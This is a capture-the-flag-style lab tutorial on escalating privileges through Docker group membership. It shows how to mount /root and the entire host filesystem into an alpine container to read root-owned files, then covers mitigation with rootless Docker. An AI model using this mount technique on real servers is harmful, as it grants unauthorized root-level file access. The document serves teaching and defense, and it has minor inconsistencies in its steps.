# Privilege Escalation Scenario 

In this scenario, you are a developer who has been given access to a server to build and test your Docker application.

You have been given access to the Docker Linux group, which provides you access to run Docker commands on the server.

However, you have not been give root access to the instance, as it is used by an administrator to perform some essential tasks.

## Mounting Volumes

## The Flag

The flag is located at /root/flag.txt. Your mission is to retrieve the contents of this file, by mounting it to a Docker container and using this container to echo the contents of the file.



## Workflow

SSH into the instance as the playground user` 

Try and read the /root/flag.txt file 

```bash
cat /root/flag.txt
```

Which should give the following:
```bash
# cat: /root/flag.txt: Permission denied
```

As you can see, the user does not have access to the file as its is owned by the root user, in their home directory which they do not have permission to view.

Let's try and change to the root user using the `sudo` command. 

```bash
sudo su
```

You should receive an error:
```bash
[sudo] password for playground:
playground is not in the sudoers file.  This incident will be reported.
```

And that didn't work, as we haven't been given sudo permissions to access the root user.

So what now!

Well, we have been given access to the `docker` group on Linux. This group provides us access to the Docker runtime, which we can use to run commands using the docker cli.

Lets try a basic hello world, just to make sure our permissions are working as expected:

```bash
docker run hello-world
```

You should see the following message when the container starts:

```bash
Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/
```

So, we can run a Docker container! Now, what about volumes? Maybe we can mount a location on the server to a Docker image?

We'll use the `alpine` image, a lightweight operating system which includes the commands we want to use to access files: `cd` and `cat`.

To start off, lets create a file in the `playground` user's home directory, and check we can mount and view this file:

```bash
echo "testing 123" > ~/test.txt
```

`~` is shorthand for the current user's home directory. Let's check we've created the file as expected:

```bash
cat /home/playground/test.txt #testing 123
```

Looks good to me!

Before we start up the container, lets just get the current hostname of the server, we'll compare the hostname within the container to this to ensure we've entered the container okay.

```bash
echo $HOSTNAME #ip-10-0-0-150
```


Now we'll spin up a container using the alpine image, and mount the home directory using the `-v` flag.

```bash
docker run -it -v /home/playground:/mnt alpine sh # / 
```

We've now created a container, and attached our shell to the shell inside of the container. We can validate we're actually inside of a container by running the following command:

```bash
docker run -it -v /home/playground:/mnt alpine sh
```

Now let's validate the container's hostname:
```bash
echo $HOSTNAME
```

First, we'll check where we are inside of the container's file system, then move to the /mnt directory where the data from the host server should be located:

```bash
/ # pwd
/
/ # cd mnt
/mnt # ls
test.txt
```

Now we can use the `cat` command to read the contents of the test.txt file we created:

```bash
/mnt # cat test.txt
testing 123
```

Looks like that worked! 

Okay, we've validated that we can create a container using a non root user, and then mount a directory on the host server onto the actual container. We've also confirmed we can read the contents of a file stored in that directory. Now, let's exit the container, and create a new container, this time mounting the root user's directory so we can retrieve the flag.

To exit the container:

```bash
$ /mnt # exit
```

Confirm you're back on the host server by checking the hostname:

```bash
playground@worker1:~$ echo $HOSTNAME
ip-10-0-0-150
```

Now we will repeat what we did above to create a container from the `alpine` image and mount the user's volume, but this time mounting the `/root` home directory instead of `/home/playground`:

```bash
playground@worker1:~$ docker run -it -v /root:/mnt alpine sh
/ # echo $HOSTNAME
c08716be0cf9
```

There we go, we're in a new container, with a new ID which is set as the hostname.

Let's now go back to the `/mnt` directory in the container and have a look around:

```bash
/ # cd /mnt
/mnt # ls
flag.txt
```

Looks like we're able to view the list of files. Now, let's read the contents of `flag.txt`:

```bash
/mnt # cat flag.txt
this is the flag
/mnt # exit
```

We can take this even further, and mount the entire host volume to the container:

```bash
playground@worker1:~$ docker run -it -v /:/mnt alpine sh
```

```
/ # exit
```



## Mitigation

This attack vector can be mitigated by using a rootless installation of Docker.

https://docs.docker.com/engine/security/rootless/

Now go ahead and connect to your rootless instance, and run the rootless Docker installer:

This is the second instance you have been provided, run the following command within wetty to connect using the password provided to you:

```ssh playground@<adjective>-2-panda.devopsplayground.org```

Then run the following command to install Docker rootless:

```bash
curl -fsSL https://get.docker.com/rootless | sh
```

The output should look something like this:

```bash
# Installing stable version 20.10.11
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 60.4M  100 60.4M    0     0  63.2M      0 --:--:-- --:--:-- --:--:-- 63.2M
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 18.0M  100 18.0M    0     0  48.0M      0 --:--:-- --:--:-- --:--:-- 47.9M
+ PATH=/home/ec2-user/bin:/home/ec2-user/.local/bin:/home/ec2-user/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin
+ /home/ec2-user/bin/dockerd-rootless-setuptool.sh install
[INFO] Creating /home/ec2-user/.config/systemd/user/docker.service
[INFO] starting systemd service docker.service
....
[INFO] Installed docker.service successfully.
[INFO] To control docker.service, run: `systemctl --user (start|stop|restart) docker.service`
[INFO] To run docker.service on system startup, run: `sudo loginctl enable-linger ec2-user`

[INFO] Creating CLI context "rootless"
Successfully created context "rootless"

[INFO] Make sure the following environment variables are set (or add them to ~/.bashrc):

export PATH=/home/ec2-user/bin:$PATH
export DOCKER_HOST=unix:///run/user/1001/docker.sock
```

Start the docker service by running:

```bash
systemctl --user start docker.service
```

You'll need to now set some environment variables so the Docker CLI knows how to interact with the docker host service. Copy the last two lines from the install output and run them:

```bash
export PATH=/home/ec2-user/bin:$PATH
export DOCKER_HOST=unix:///run/user/1001/docker.sock
```

Let's use the hello-world image to confirm we can actually use docker in rootless mode:

```bash
docker run hello-world
```

```
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
2db29710123e: Pull complete
Digest: sha256:cc15c5b292d8525effc0f89cb299f1804f3a725c8d05e158653a563f15e4f685
Status: Downloaded newer image for hello-world:latest

Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/

```

You can attempt to run a container, with the /root directory mounted, and this will succeed:

```bash
docker run -it -v /root:/mnt alpine sh
```

```bash
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
97518928ae5f: Pull complete
Digest: sha256:635f0aa53d99017b38d1a0aa5b2082f7812b03e3cdb299103fe77b5c8a07f1d2
Status: Downloaded newer image for alpine:latest
/ # ls
bin    etc    lib    mnt    proc   run    srv    tmp    var
dev    home   media  opt    root   sbin   sys    usr
```

Now try and list the files in the /mnt directory:

```bash
ls mnt
```

```bash
ls: can't open 'mnt': Permission denied
```

There we go, we've successfuly mitigated against this privilege escalation by running Docker in rootless mode.
